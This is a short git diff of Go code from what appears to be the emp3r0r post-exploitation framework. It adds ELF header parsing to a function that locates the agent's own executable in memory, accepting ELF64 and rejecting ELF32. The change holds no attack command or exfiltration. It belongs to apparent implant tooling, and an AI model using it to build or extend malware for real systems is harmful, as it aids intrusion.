@@ -9,6 +9,7 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	exe_utils "github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
 )
 
 // EXE_MEM_FILE save the whole executable
@@ -164,6 +165,21 @@ func FindEmp3r0rELFInMem() (err error) {
 				continue
 			}
 			log.Printf("Found emp3r0r ELF in memory region 0x%x", base)
+
+			// parse ELF headers
+			header, err := exe_utils.ParseELFHeaders(mem_region)
+			if err != nil {
+				log.Printf("Parse ELF headers: %v", err)
+				continue
+			}
+			elf64Header := new(exe_utils.ELF64Header)
+			ok := false
+			if elf64Header, ok = header.(*exe_utils.ELF64Header); ok {
+				log.Printf("Found ELF64 header: %v", elf64Header)
+			} else if elf32Header, ok := header.(*exe_utils.ELF32Header); ok {
+				log.Printf("Found ELF32 header: %v, not supported, aborting", elf32Header)
+				return fmt.Errorf("ELF32 not supported")
+			}
 
 			// start_of_current_region reading from base
 			current_region := mem_regions[base]
